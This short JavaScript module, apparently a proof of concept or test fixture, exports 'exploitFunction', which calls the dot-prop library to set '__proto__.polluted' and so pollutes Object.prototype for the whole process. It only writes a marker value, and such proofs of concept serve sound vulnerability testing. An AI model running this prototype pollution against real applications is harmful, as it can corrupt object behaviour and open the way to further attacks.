function exploitFunction(payload) {
  const dotProp = require("dot-prop");
  dotProp.set({}, "__proto__.polluted", "yes");
  
  return {};
}

module.exports = { exploitFunction };